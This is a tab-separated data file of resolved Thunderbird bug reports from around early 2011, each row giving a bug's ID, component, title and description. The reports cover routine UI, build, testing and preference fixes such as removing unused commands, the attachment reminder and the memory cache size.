640649%TAB%1299746593%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Remove unused button_file and cmd_file,Remove unused cmd_file%TAB%Remove unused button_file and cmd_file,Remove unused cmd_fileIt seems that button_file and cmd_file are no longer used to do anything, but references to them still exist:  mail/base/content/messageWindow.js 733:      case "button_file": 734:      case "cmd_file": 869:      case "button_file": 870:      case "cmd_file":  mail/base/content/mailWindowOverlay.xul 113:    <command id="cmd_file" disabled="true"/> 288:  <command id="button_file"/> 1710:                   observes="button_file"  mail/base/content/mail3PaneWindowCommands.js 229:      case "button_file": 230:      case "cmd_file": 378:      case "button_file": 379:      case "cmd_file":  We should probably just get rid of them.
640628%TAB%1299741779%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Preferences%TAB%Accessing "Download more dictionaries" from the Preferences dialog should open a content tab not the external browser%TAB%Accessing "Download more dictionaries" from the Preferences dialog should open a content tab not the external browserAMO can now detect Thunderbird and offer to download dictionaries at the right time.  Therefore if the user selects to download dictionaries from the compose section in the preferences dialog we should open AMO in a tab so that users can install dictionaries directly.
640627%TAB%1299741692%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Message Compose Window%TAB%Accessing "Download more dictionaries" from the Check Spelling dialog should open a content tab not the external browser%TAB%Accessing "Download more dictionaries" from the Check Spelling dialog should open a content tab not the external browserAMO can now detect Thunderbird and offer to download dictionaries at the right time.  Therefore if the user selects to download dictionaries from the check spelling dialog (EdSpellCheck) we should open AMO in a tab so that users can install dictionaries directly.
640543%TAB%1299728586%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%Random orange: TEST-UNEXPECTED-FAIL | test-retest-config.js | test_re_test_config%TAB%Random orange: TEST-UNEXPECTED-FAIL | test-retest-config.js | test_re_test_configWe were getting a few issues with random oranges on the account wizard before, but since the latest changes, we're getting slightly different ones:  TEST-PASS | test_remember_password TEST-UNEXPECTED-FAIL | test-retest-config.js | test_re_test_config   EXCEPTION: timeout exceeded for waitForEval('subject.disabled == false && subject.hidden == false')     at: controller.js line 499             controller.js 499             test-retest-config.js 87             frame.js 469        WindowWatcher_notify([object XPCWrappedNative_NoHelper]) test-window-helpers.js 255 TEST-UNEXPECTED-FAIL | (runtestlist.py) | Exited with code 1 during directory run
640342%TAB%1299677489%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End%TAB%Archive granularity should be flat when using GMail%TAB%Archive granularity should be flat when using GMailThis was originally fixed in bug 475852 with a special check in BatchMessageMover, but bug 517514 inadvertently removed it. However, maybe we want to do this a little bit differently. One option would just be setting the archive_granularity pref on the first identity for the GMail account when it's created. This would allow people to change that if they really wanted. I'm not sure if that's a good thing or not.  Alternately, we could do it the same way as before, but this would mean that we'd probably want to check for Gmail servers and disable the archive options dialog in bug 607295, since changing those prefs wouldn't actually do anything.
640090%TAB%1299619382%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Give account central system colors for non-Windows themes%TAB%Give account central system colors for non-Windows themesBug 620467 gave account central system colors on Windows. We should probably do this for Mac and Linux too.  Here's a patch for Linux. Not sure what the colors should be on Mac, since I can't really test them out.
639578%TAB%1299498075%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Reorder context menu items to be consistent with Firefox's%TAB%Reorder context menu items to be consistent with Firefox'sCurrently, the suggestions items for spellchecking are at the bottom of the context menu. In Firefox, they're at the top.  <protz> so in Firefox, from top to bottom, we have undo / cut copy paste / select all <protz> in Thunderbird, it's undo select all cut copy paste without separator  These items should be reordered to be consistent with Firefox's ordering.
639462%TAB%1299469648%TAB%379511%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%"make install" doesn't install the SDK%TAB%"make install" doesn't install the SDKI've started providing nightly builds from comm-central in Ubuntu now, and I noticed that running "make install" no longer installs the SDK.  I'm not sure if this is intentional or not, but the attached patch fixes this (which just sets INSTALL_SDK=1 in mail/installer/Makefile.in, and is copied from browser/installer/Makefile.in for Firefox)
638980%TAB%1299252726%TAB%23131%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Compose Window%TAB%Status bar should only have progress meter showing whilst loading stuff%TAB%Status bar should only have progress meter showing whilst loading stuffAt the moment the message compose window has an empty progress meter and it is not collapsed when not in use. All other mail windows do collapse it.
638801%TAB%1299223750%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Toolbars and Tabs%TAB%Add an extra onLoad argument to contentTab and chromeTab arguments%TAB%Add an extra onLoad argument to contentTab and chromeTab argumentsProblem: --------    Outer code opens a tab, and wishes the chrome page that's loaded in the tab to do something with its outer data once the chrome page is loaded. The data held by the outer code might be a closure, some component that the outer code has instantiated, some parameter, or whatever...  Solution 1: -----------    Outer code (myCodeModule.jsm):     1: tabmail.openTab("chromeTab", { chromeUrl: ... });     2: tab.browser.contentWindow.myFunc(myData);   Inner code (myChromePage.html):     3: function myFunc(aMyData) {     4:   ...     5: }    This is not a solution because, as http://hsivonen.iki.fi/about-blank/ tells   us, the <browser> that makes the chrome tab will start loading about:blank,   and we have no guarantee about the sequence of events. We'd like to make sure   that line 2: executes after the chrome page has been fully loaded and is   operational, but AFAIK, we have no such guarantee.  Solution 2: -----------    Outer code (myCodeModule.jsm):     1: tabmail.openTab("chromeTab", { chromeUrl: ... });     2: tab.browser.myData = ...;   Inner code (myChromePage.html):     3: document.addEventListener("onload", function _myCallback () {     4:   let myData = top.myData;     5: });    This is not a solution because, as http://hsivonen.iki.fi/about-blank/ tells   us, the <browser> that makes the chrome tab will start loading about:blank,   and we have no guarantee about the sequence of events. We'd like to be sure   that _myCallback will never be called between lines 1 and 2, but AFAIK, we   have no such guarantee.    Other non-solutions: --------------------    - Pass the data as a URL parameter: not feasible, because the data cannot be     easily stringified.   - Use a global array, store the data in the array, pass the index to the inner     chrome page, have the chrome page retrieve its data using the global array.     Ugly.        Proposed solution: ------------------    Outer code:     1: tabmail.openTab("chromeTab", {     2:   chromeUrl: ...,     3:   onLoad: function (aEvent, aBrowser) {     4:     aBrowser.contentWindow.doStuff(withMyData);     5:   },     6: });   Inner code:     1: function doStuff(aMyData) { ... }    This solution has the advantage of offering all the guarantees we need. Plus,   it is intuitive, and in the course of developing a few addons, I've wanted   this everytime I've been interacting with content tabs. This solution is   implemented by the patch attached.  I might be missing something, but I remember discussing this extensively with bwinton (CC'd) over IRC, and if I recall correctly, we both came to the conclusion that I had to submit such a patch or duplicate the chromeTab functionnality in my own code and add the required hook.
638607%TAB%1299163374%TAB%23131%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Remove obsolete cmd_showComposeToolbar%TAB%Remove obsolete cmd_showComposeToolbarThe caller for cmd_showComposeToolbar disappeared back in 2003 - http://bonsai.mozilla.org/cvsview2.cgi?diff_mode=context&whitespace_mode=show&root=/cvsroot&subdir=mozilla/mail/components/compose/content&command=DIFF_FRAMESET&file=messengercompose.xul&rev2=1.3&rev1=1.2  We should probably get rid of cmd_showComposeToolbar from messengercompose.xul and MsgComposeCommands.js
638605%TAB%1299163123%TAB%151407%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Disable about:rights in mozmill tests%TAB%Disable about:rights in mozmill testsDebug builds and unofficial builds don't show about:rights. http://mxr.mozilla.org/comm-central/source/mail/app/profile/all-thunderbird.js#60  We don't want them in our mozmill runs ever, so we shall add a compulsory preference to runtest.py to disable it in all cases.  This has rs=Standard8 from irc.
638481%TAB%1299141918%TAB%408155%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%The "to" button looks off,The "to" button in the "New message" window looks off%TAB%The "to" button looks off,The "to" button in the "New message" window looks offUser-Agent:       Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.15pre) Gecko/20110222 Ubuntu/10.10 (maverick) Namoroka/3.6.15pre Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.15pre) Gecko/20110207 Lightning/1.0b2 Shredder/3.1.9pre  The button looks like Win 85 and doesnt follow the gtk theme.  Reproducible: Always  Steps to Reproduce: 1. Create new mail  Actual Results:   The button looks off.  Expected Results:   The button should follow the selected gtk theme
638407%TAB%1299121832%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Border around 3 content pane different from Firefox%TAB%Border around 3 content pane different from FirefoxThis is kind of a followup to bug 569400 (even though it hasn't landed yet), but I didn't want to add more noise or blocking items to that bug. It would be neat with a bit of a border around the TB content.
638166%TAB%1299061470%TAB%42319%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%:active icons in prefwindow has wrong style%TAB%:active icons in prefwindow has wrong styleBug 631502 made it so the prefwindow's :active icons are styled with a svg filter. Atm the icons are way too dark when they're pressed, since the filter applies to the :active icon, instead of the "normal" icon.
637651%TAB%1298958909%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%"Creating account" wording is a bit confusing%TAB%"Creating account" wording is a bit confusingJust some word confusion that came up during the TB UI testing [1] with one of the participants.  In the account setup dialog, the dialog that finishes the account setup is called "Create account". This is a bit confusing since you're not creating any new account, you're just signing into it using Thunderbird. At the same time you're creating it in Thunderbird, though :)  One way we could do it is to have it say "Sign in" instead. Hotmail and Gmail used that word.
637641%TAB%1298955626%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Folder and Message Lists%TAB%Folders for sent, drafts etc. are hidden by default when using gmail%TAB%Folders for sent, drafts etc. are hidden by default when using gmailOne thing that came up in the TB UI testing [1] is that a lot of people had issues finding their sent folder. This was because after you've set up a new gmail account, the [Gmail] subfolders where sent, drafts etc. are located are hidden/collapsed by default.
636014%TAB%1298383889%TAB%22599%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%[autoconfig] Align labels and textfields,[autoconfig] Align labels and textfields on the existing account wizard%TAB%[autoconfig] Align labels and textfields,[autoconfig] Align labels and textfields on the existing account wizardThe name/email/password fields in the Account Creation wizard have labels with a class="autoconfigLabel" which just sets a certain width in em. If any of the labels is longer, the textfields are misaligned. You can see tat in TB 3.1 in French, it looks really awful. The bug is assuming that the labels are smaller than so-and-so em.  Similarly, in the Result display (after we found a working config automatically), the "Incoming"/"Outgoing"/"Username" labels are not base-aligned. Maybe because the labels have a smaller font. <hbox align="baseline"> doesn't fix it. Also, they should use a <grid>, too, for the same reason as above.
635993%TAB%1298380037%TAB%279382%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Attachment reminder doesn't recognize file names with matching file-type extensions%TAB%Attachment reminder doesn't recognize file names with matching file-type extensionsThis seems to have worked as introduced in bug 492555 comment #21, but while testing for bug 635938, I've noticed that something like "blah.doc" does no longer trigger the attachment reminder whereas "blah .doc" with as space does. Multi-token words like "semi-attached" still trigger based on "attached", but somewhere the "." handling must have got lost which is needed to correctly match any file extensions in file names.  Tested in current Windows and Linux trunk builds.
635938%TAB%1298369102%TAB%99100%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Support more common ms-word extensions for the missing attachment query%TAB%Support more common ms-word extensions for the missing attachment queryspun off bug 633818   .xls and .ppt (maybe .rtf and .pps)  Wondering about the these days more common ".docx" I've tried on trunk if it's recognized, and found that it isn't (thus adding to my concern in bug 633818 comment #3 about having the "normal" keywords clouded by file extensions).  It actually didn't even find "bla.doc", but only "bla .doc" with a space, so that feature appears a bit broken on trunk anyway if only exact keywords are found for the purpose of file-extension matching. Is this a known issue?
635693%TAB%1298260915%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Clicking on links in add-on manager brings up tabs with addons.mozilla.org but you can't do anything in those tabs (e.g. Personas installation)%TAB%Clicking on links in add-on manager brings up tabs with addons.mozilla.org but you can't do anything in those tabs (e.g. Personas installation)If I go into the add-ons manager and click on one of the links, e.g. an author link for an add-on or a link in the Get-Add ons pane, these all open up in a new tab.  However, that tab has no browse capabilities - all clicks end up being directed to the default browser.  There are probably two issues to this:  1) iirc the code for opening the add-on manager tab is set up so that all clicks on links matching "addons.mozilla.org" are loaded in the same tab as what the add-on manager opened in.  That clearly isn't happening, and it may not be a major issue, but I'd at least like to understand why.  2) We should have a way to inherit click handlers across content tabs. So, I want to say that all clicks matching "addons.mozilla.org" should open in a new tab and that tab should handle links to "addons.mozilla.org" internally in the tab and redirect other links to the default browser.
635688%TAB%1298257916%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Update openAddonsMgr to take a add-on pane URI as argument and correctly open the add-ons Manager pane%TAB%Update openAddonsMgr to take a add-on pane URI as argument and correctly open the add-ons Manager paneThunderbird's openAddonsMgr function is meant to take the add-on pane to display as an argument, but currently ignores it.  We need to port the changes that Firefox did to BrowserOpenAddonsMgr.  This is needed so that certain calls will work, e.g. openAddonsMgr("addons://list/theme") should open the add-on manager at the themes pane, which we need for at least one notification.
635471%TAB%1298086286%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Change discoverURL to /%LOCALE%/%APP%/discovery/pane/%VERSION%/%OS%%TAB%Change discoverURL to /%LOCALE%/%APP%/discovery/pane/%VERSION%/%OS%The addons manager will load the following URL for the discovery pane: https://services.addons.mozilla.org/en-US/thunderbird/discovery/VERSION/OS/#GUIDS  However, loading that redirects to: https://services.addons.mozilla.org/en-US/thunderbird/discovery/pane/VERSION/OS/#GUIDS  (Which has /pane/ inserted into the middle of the URL.)  This means the addons manager can't detect when the base page is still being displayed. So, for bug 628290, clicking on Get Add-ons will *always* reload the page, even when it doesn't need to.  We need to update the url as per bug 630120.
635318%TAB%1298025027%TAB%256169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General,Preferences%TAB%Duplicate accesskey in Copies & Folders settings dialog%TAB%Duplicate accesskey in Copies & Folders settings dialogUser-Agent:       Mozilla/5.0 (X11; Linux i686; rv:2.0b12pre) Gecko/20110218 Firefox/4.0b12pre Build Identifier: Mozilla/5.0 (X11; Linux i686; rv:2.0b10pre) Gecko/20110114 Thunderbird/3.3a2  Letter C appears twice, preventing user of a keyboard to check appropriate box  Reproducible: Always  Steps to Reproduce: 1. Go to Account Settings 2.  Choose copies & Folders 3. Choices "Place replies in teh folder of the message being replied to" and "Cc these email addresses" have both the same accesskey "C"  Actual Results:   User of keyboard only cannot choice any of these two options  Expected Results:   another accesskey should be set (se attached patch)
634907%TAB%1297926017%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Testing Infrastructure%TAB%need way for mozmill tests to start up without accounts%TAB%need way for mozmill tests to start up without accountsFor testing the setup instrumentation code, it would be very helpful to have a way for mozmill tests to start up without the accounts pre-setup, so we can simulate initial run after download.   Sid has already come up with a patch for this, which works great for my purposes. If you add a wrapper.py file containing NO_ACCOUNTS = True to your test directory, your profile won't have accounts pre-setup at load.
634620%TAB%1297843850%TAB%355920%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%In Compose Window: Renaming an attached file removes its displayed file size%TAB%In Compose Window: Renaming an attached file removes its displayed file sizeUser-Agent:       Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b12pre) Gecko/20110214 Firefox/4.0b12pre Build Identifier: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b12pre) Gecko/20110216 Thunderbird/3.3a3pre  As soon as you rename an attached file in the compose window,  the attached file's originally displayed file size disappears.  Reproducible: Always  Steps to Reproduce: 1. Open a new compose Window 2. Attach a file (the file size will be displayed immediately) 3. Rename the attachment (right-click on the attached file - choose "rename") 4. File gets renamed, but its file size disappears
634272%TAB%1297752852%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Theme%TAB%Missing tab close button on Mac%TAB%Missing tab close button on MacBug 589219 changed appearance of the button and also the file name, we need to port the changes to Thunderbird.
633679%TAB%1297445138%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Toolbars and Tabs%TAB%Quick filter button/menuitem shouldn't be invisible when disabled%TAB%Quick filter button/menuitem shouldn't be invisible when disabledWhen you can't activate the quick filter bar, the tab bar button for it is hidden via visibility:hidden. I assume this is intentional (so the tabs don't expand/shrink when you switch to/from a tab where the qfb is useless), but this has two problems:  1) When looking at Lightning tabs, there's a big empty space where the qfb    button would be, which looks weird. 2) The visilibity:hidden style appears to be applied to the menuitem in View ->    Toolbar as well, so there's an invisible row. Based on the comments, it looks    like this should actually appear as disabled, not invisible.  I'm not sure what the best way to fix (1) would be, but you could probably fix (2) by setting an attribute on the button and then use a CSS selector to make it invisible, which would hopefully not mess with the menuitem. I'm not totally sure this would work though, since I think the problem is some strangeness with the observes attribute on the menuitem.
633620%TAB%1297431007%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%make nsIMsgDBView cell text scriptable%TAB%make nsIMsgDBView cell text scriptablensITreeView.getCellText is not scriptable, which makes it hard/impossible to write xpcshell tests for some of the code in nsMsgDBView. For things like using the display name in the view, or the who column, we'd like to be able to do some simple tests.
633498%TAB%1297401929%TAB%151407%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Testing Infrastructure%TAB%Provide structured context information about mozmill failures%TAB%Provide structured context information about mozmill failuresWe currently get relatively little information about our mozmill test failures.  I propose we do the following, in broad strokes:  1) When a failure is reported, gather information about the state of Thunderbird:  a) Always gather some data that can't hurt.  For example, render a canvas-based screenshot of each window and characterize broad UI state (what window is focused, what widget in that window is focused, high-level tab info which may not be obvious from the screenshot).  b) Provide "event timeline" data for the time period shortly before the start of the test up through declaration of the failure.  The canonical example of such events is folderEventLogHelper.js which provides an nsIMsgFolderListener and reports everything it hears using logHelper's mark_action.  This data would normally be written into an in-memory buffer and discarded in cases where a test does not fail.  c) Provide hooks for specific tests/test families to provide additional information.   2) "Report" that information by either writing it to a file or printing it out on stdout.  The stdout idea is for tinderbox.  We can scrape the data out of the buildlog after the fact and do something useful with it without first having to stand up a reliable fancy data store.  (We can later move to having the run directly POST its results to a reliable infrastructure server if so desired.)
633492%TAB%1297399995%TAB%151407%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%remove useless test-window-helpers.js dump statements%TAB%remove useless test-window-helpers.js dump statementsI left a bunch of annoying dump statements in test-window-helpers.js.  They may have been useful at some point, but they just seem to add useless gibberish to the output at this point.
632535%TAB%1297167382%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Port bug 617028 (expose graphics failures in about:support) to Thunderbird%TAB%Port bug 617028 (expose graphics failures in about:support) to ThunderbirdAs usual, I'd like to stay in sync with m-c so I'm not fixing the indentation.
632390%TAB%1297146695%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Message reading and context menu can get broken when opening content tabs%TAB%Message reading and context menu can get broken when opening content tabsSTR:  1) Restart Thunderbird 2) Select a message thread so that the multi message summary view is displayed 3) Open the add-ons manager or some other content tab 4) Switch back to the 3-pane mail tab  At this point the context menu doesn't update correctly (and you get errors about content being null) and sometimes with the Conversations add-on, message reading can be broken as well.  The issue appears to be that window.content is ending up as null. window.content normally tracks the content of the browser element with type "content-primary".  I've checked that we set "content-targetable" on elements before "content-primary" and that seems fine, but still fails.  It appears only to happen with the multi-message view selected (in step 2) - a chrome browser - not the single message view - the content browser.  So I'm currently confused as to what is happening.
632197%TAB%1297086798%TAB%406100%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Could you add a 'send again' function%TAB%Could you add a 'send again' functionUser-Agent:       Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; en-us) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4 Build Identifier: Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.13) Gecko/20101207 Thunderbird/3.1.7  Eudora had/has a handy feature to re-send an existing e-mail.  'Send again' makes using an existing e-mail very handy since all of the from and to is already duplicated, along with the subject etc.  This means only the body text needs to be fussed with.  Very Handy. 
631916%TAB%1296981048%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%Make about:support code use MailServices%TAB%Make about:support code use MailServicesI'm not even going to try to make all our code use MailServices, but this code is fairly new and only has a few uses.  (I'm not completely happy with MailServices.accounts.accounts, so I wouldn't mind changing that to something like MailServices.acctMgr.)
630963%TAB%1296644883%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%about:support doesn't work on some Linux distributions%TAB%about:support doesn't work on some Linux distributionsCurrently we assume that the libraries libglib-2.0.so, libgobject-2.0.so, and libgio-2.0.so exist. Turns out that it isn't the case for Fedora 12 and probably other distros -- the files that they do have are called libglib-2.0.so.0 etc.  We could either remove the Linux code entirely, or catch the exceptions and display "(Unknown location)" if any of the libraries we need aren't found.
630857%TAB%1296628389%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Build Config%TAB%Port some makefile changes/updates to Thunderbird's installer and locale Makefiles%TAB%Port some makefile changes/updates to Thunderbird's installer and locale MakefilesJust wanted to do a general update of these files, mainly based on a diff with browser's files, so there's some re-ordering as well as the updates.  Bugs pulled in are:  Bug 569268 - Package correct Visual C++ CRT DLLs based on compiler version Bug 485860: change automation to also post en-US xpi, just like any other locale -- don't override PKG_LANGPACK_PATH when generating en-US langpack Bug 607396: port checksums work to l10n - remove now-obsolete l10n-upload-% target
630759%TAB%1296581429%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Reader UI%TAB%Improve attachment list XBL bindings%TAB%Improve attachment list XBL bindingsThe current XBL bindings for the attachment list in the reader have some problems. Aside from being an obscure name (a <description> tag with selectable="true"), there's no keyboard accessibility, the arrow keys behave strangely, and things don't get updated properly when switching between large and small icons. Attached is a WIP XULRunner app with a new set of bindings for the attachment list (to be used in both the reader and the composer). Here's a short list of why this is better than the status quo:    1) it has built-in support for displaying file size (prettily)   2) it supports scrolling and scrolling-related methods   3) it has a less-stupid name   4) it has both a horizontal and vertical mode so it can be used in      multiple places (e.g. reader and composer)   5) up/down/left/right work as expected in horizontal mode   6) it works better when swapping view modes   7) it has smooth scrolling (so drag-and-drop reordering will be easier)   8) it matches platform theming of selected icons a la Windows Explorer      and friends (well, it will; currently only Windows theming is done)   9) easier to set context menus (via the itemcontext attribute)  10) built-in handling of attachment objects via appendItem  It may also be worth considering whether checkboxes should be used to select attachments (preferably this would be optional, since it would violate ux-consistency).
630484%TAB%1296521876%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Search%TAB%Properly support plural forms in advance search dialog status message%TAB%Properly support plural forms in advance search dialog status messageI noticed a while back that the 1 match found/n matches found status message in the advanced search dialog doesn't properly support plural forms.
630330%TAB%1296475838%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Windows theme swaps "Drafts" and "Templates" icons%TAB%Windows theme swaps "Drafts" and "Templates" icons... well, or the Linux theme does, since the two are inconsistent.  In the Windows theme, the "drafts" icon is the little sheet of paper with a pyramid of dots, and the "templates" icon is the little sheet of paper with writing on it. In Linux, these are reversed. One of these is probably wrong, and I'm leaning towards Windows being the one in error, since 1) the paper with writing seems more "draft-y" to me, and 2) it looks closer to the drafts icon on Mac.
630176%TAB%1296449413%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Build Config%TAB%Add the comm-central source stamp to Thunderbird's source stamp file%TAB%Add the comm-central source stamp to Thunderbird's source stamp fileNow that bug 549958 has altered how the source stamp files are done, we should append the comm-central stamp to Thunderbird's version of the file.  Patch attached to do that (I would copy and paste to suite, but I expect that SM probably wants to do their extension repos as well).
630115%TAB%1296420996%TAB%343213%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Address Book%TAB%Thunderbird auto selects TO as I select addresses to SEND a little later as BCC.%TAB%Thunderbird auto selects TO as I select addresses to SEND a little later as BCC.User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.237 Safari/534.10 Build Identifier: 3.1.7  Thunderbird auto selects TO as I am in the middle of selecting addresses to be Sent a little later as BCC.  This appears to have no pattern as sometimes my selecting has no interference and other times, the addresses I have chosen just show up in the send field as TO without any action from me.   Thanks for any help.  Don   Reproducible: Sometimes  Steps to Reproduce: 1.Looking at your contact list, use the CTRL key to make multiple selections. 2. 3. Actual Results:   Sometimes works OK, other times not OK.   It should have waited for me to select where I wanted the list to go, i.e., TO, CC, or BCC.
629686%TAB%1296200968%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Build Config%TAB%Port bug 620837 - Modify blocklist pingCount parameter to track pingCount for profile and for version%TAB%Port bug 620837 - Modify blocklist pingCount parameter to track pingCount for profile and for versionWe just need to add a couple more parameters to get better tracking. I'll attach a patch a bit later.
629247%TAB%1296059428%TAB%279382%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%Remove 4MB limit for memory-cache and base it on physical memory size instead%TAB%Remove 4MB limit for memory-cache and base it on physical memory size insteadHistorically, the memory-cache size was set to 4MB and disk-cache size to 50MB, changeable by a preference setting. In the networking core, this was changed by bug 309729 to use a formula (updated later by bug 296538) which determines the memory-cache size as a function of the physical RAM available on a machine.  From mozilla/netwerk/cache/nsCacheService.cpp: >   RAM   Cache >   ---   ----- >   32 Mb   2 Mb >   64 Mb   4 Mb >  128 Mb   6 Mb >  256 Mb  10 Mb >  512 Mb  14 Mb > 1024 Mb  18 Mb > 2048 Mb  24 Mb > 4096 Mb  30 Mb > > The equation for this is (for cache size C and memory size K (kbytes)): >  x = log2(K) - 14 >  C = x^2/3 + x + 2/3 + 0.1 (0.1 for rounding) >  if (C > 32) C = 32  Given that 4MB cache feels ridiculously low these days, adopting this for TB as well makes sense (especially since many providers have a message-size limit around 30MB now). Ideally, the memory cache should be large enough to keep a full message without having to consult the disk or the network again when revisiting it after a short visit to another message.  I've been using "-1" as default for SeaMonkey without seeing any issues with Mail/News, and have tried both "32768" and "-1" on Thunderbird without any performance issues, however noticing a better performance with large messages when the disk cache is disabled. This will minimally increase the memory footprint, but not beyond other Mozilla applications, and the benefits should justify it.
629132%TAB%1296041776%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Build Config%TAB%Add rm (Romansh) to mail/all-locales for 1.9.2 branch%TAB%Add rm (Romansh) to mail/all-locales for 1.9.2 branchIn Bug 622447 Romansh has pushed files for their new locales.  We need to add rm to mail/locales/all-locales on 1.9.2 for dashboard and l10n nightly build coverage.
628768%TAB%1295955593%TAB%5003%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Mail Window Front End%TAB%mark as read toggle broken%TAB%mark as read toggle brokenI use the "m" key to mark messages that I've just read as unread. That broke recently. Now it seems it can only unread messages as read which seems pretty useless to me. If I've got the message selected then it's mostly likely already marked read.   Keyboard shortcuts are critical for an email client. We can't let them break, even for a few days. This is really really painful and caused me to revert from nightly builds to the ill-performant previous release.
628760%TAB%1295954435%TAB%49577%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Migration%TAB%Remove nsVoidArray from TB nsSeamonkeyProfileMigrator.*,Remove nsVoidArray from mail/%TAB%Remove nsVoidArray from TB nsSeamonkeyProfileMigrator.*,Remove nsVoidArray from mail/"Found 17 matching lines in 2 files"
628586%TAB%1295906065%TAB%298618%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%steelIApplication needs new iid due to changes in parent interface extIApplication%TAB%steelIApplication needs new iid due to changes in parent interface extIApplicationUser-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E) Build Identifier: Mozilla/5.0 (Windows NT 5.1; rv:2.0b10pre) Gecko/20110114 Thunderbird/3.3a2  By comparing Tb33 to Tb31 interfaces, steelIApplication needs new iid because extIApplication was changed  Tb31: readonly attribute extIExtensions extensions;  Tb33: void getExtensions(in extIExtensionsCallback aCallback);   Reproducible: Always
628204%TAB%1295816337%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Finish off about:support tests%TAB%Finish off about:support testsThe compose window in particular needs some testing. Tests for getting the account details are going to require a bit more work, and I think getting at least the compose tests in is important.
627829%TAB%1295608613%TAB%26835%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Add hbox enclosing messagepanebox%TAB%Add hbox enclosing messagepaneboxUser-Agent:       Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 Build Identifier: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b10pre) Gecko/20110121 Thunderbird/3.3a3pre  Following the example of bug 516033: For add-ons modifying the message pane it would make life easier if the box messagepanebox would be within a named hbox.   Then the add-on could add stuff to the left or right of messagepanebox, e.g. toolbars.  A patch will follow soon (tonight).   Reproducible: Always
